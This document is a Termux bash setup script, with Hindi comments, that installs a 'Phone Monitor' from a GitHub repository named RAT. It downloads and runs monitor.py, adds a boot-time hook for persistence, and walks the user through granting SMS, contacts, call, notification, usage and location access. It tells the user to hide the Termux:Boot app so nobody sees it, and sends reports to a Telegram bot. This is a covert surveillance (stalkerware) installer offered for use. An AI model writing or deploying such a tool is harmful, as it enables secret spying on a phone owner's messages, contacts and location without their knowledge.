#!/data/data/com.termux/files/usr/bin/bash

echo "🔥 =============================================="
echo "      Phone Monitor - Full Auto Setup"
echo "=============================================="

# 1. पैकेजेज़ अपडेट
echo "🟢 [1/9] पैकेजेज़ अपडेट..."
pkg update -y && pkg upgrade -y
pkg install python git screen termux-api termux-services -y
pip install requests

# 2. स्टोरेज परमिशन
echo "🟢 [2/9] स्टोरेज परमिशन..."
termux-setup-storage
sleep 2

# 3. monitor.py डाउनलोड
echo "🟢 [3/9] monitor.py डाउनलोड..."
curl -O https://raw.githubusercontent.com/vikramsengal/RAT/main/monitor.py

# 4. Token और Chat ID सेट करें
echo "🟢 [4/9] Token और Chat ID सेट करें..."
if [ -z "$BOT_TOKEN" ] || [ -z "$CHAT_ID" ]; then
    read -p "🔑 BOT_TOKEN (अपना टोकन पेस्ट करें): " BOT_TOKEN
    read -p "🔑 CHAT_ID (अपनी चैट आईडी पेस्ट करें): " CHAT_ID
    echo "export BOT_TOKEN='$BOT_TOKEN'" >> ~/.bashrc
    echo "export CHAT_ID='$CHAT_ID'" >> ~/.bashrc
    source ~/.bashrc
else
    echo "   Token और Chat ID पहले से सेट हैं।"
fi

# 5. ऑटो-स्टार्ट (Boot) सेटअप
echo "🟢 [5/9] ऑटो-स्टार्ट (Restart) सेटअप..."
mkdir -p ~/.termux/boot
cat > ~/.termux/boot/start_monitor.sh << 'EOF'
#!/data/data/com.termux/files/usr/bin/bash
source /data/data/com.termux/files/home/.bashrc
termux-wake-lock
sleep 15
screen -dmS monitor python /data/data/com.termux/files/home/monitor.py
EOF
chmod +x ~/.termux/boot/start_monitor.sh

# 6. ⚠️ Termux:Boot इंस्टॉल और हाइड करने का निर्देश
echo "🟢 [6/9] ⚠️ Termux:Boot सेटअप (Restart पर चलने के लिए जरूरी)"
echo "==========================================================="
echo "👉 इस लिंक को कॉपी करके Chrome/Firefox में खोलें:"
echo "   https://f-droid.org/en/packages/com.termux.boot/"
echo ""
echo "👉 'Download APK' पर क्लिक करके Install करें।"
echo "👉 Install होने के बाद ऐप को **एक बार खोलें** (तुरंत बंद कर दें)।"
echo ""
echo "🔥 *इसे छिपाना है (ताकि कोई देख न सके):*"
echo "   1. होम स्क्रीन पर खाली जगह पर लंबा दबाएँ → 'Home Settings' → 'Hide apps'"
echo "   2. वहाँ 'Termux:Boot' को चुनकर छिपा दें।"
echo "   (अगर आपके फोन में Hide Apps नहीं है, तो Nova Launcher इंस्टॉल करें)"
echo "==========================================================="
echo "⏳ Termux:Boot Install करने के लिए 30 सेकंड का समय लें..."
sleep 30

# 7. परमिशन स्क्रीन खोलना
echo "🟢 [7/9] 5 परमिशन स्क्रीन खोल रहा हूँ..."
sleep 2

am start -a android.settings.APPLICATION_DETAILS_SETTINGS -d package:com.termux >/dev/null 2>&1
echo "👉 [1/5] SMS, Phone, Contacts → ALLOW करें"
sleep 8

am start -a android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS >/dev/null 2>&1
echo "👉 [2/5] नोटिफिकेशन → Termux को ON करें"
sleep 8

am start -a android.settings.USAGE_ACCESS_SETTINGS >/dev/null 2>&1
echo "👉 [3/5] उपयोग ऐक्सेस → Termux को ON करें"
sleep 8

am start -a android.settings.IGNORE_BATTERY_OPTIMIZATION_SETTINGS >/dev/null 2>&1
echo "👉 [4/5] बैटरी → 'अनुकूलित न करें' चुनें"
sleep 8

am start -a android.settings.LOCATION_SOURCE_SETTINGS >/dev/null 2>&1
echo "👉 [5/5] लोकेशन → GPS ON करें"
sleep 5

# 8. मॉनिटरिंग शुरू करें
echo "🟢 [8/9] मॉनिटरिंग बैकग्राउंड में शुरू..."
screen -dmS monitor python /data/data/com.termux/files/home/monitor.py

# 9. हो गया!
echo "🟢 [9/9] ✅ सब कुछ सेट है!"
echo "==========================================================="
echo "📩 30 सेकंड में Telegram पर पहला मैसेज आएगा।"
echo "🤖 /help भेजकर सारे कमांड देखें।"
echo "🔄 Restart के 30 सेकंड बाद मॉनिटरिंग अपने आप चालू हो जाएगी।"
echo "🔒 Termux:Boot को हाइड करना न भूलें (ऊपर Step 6 देखें)!"
echo "==========================================================="
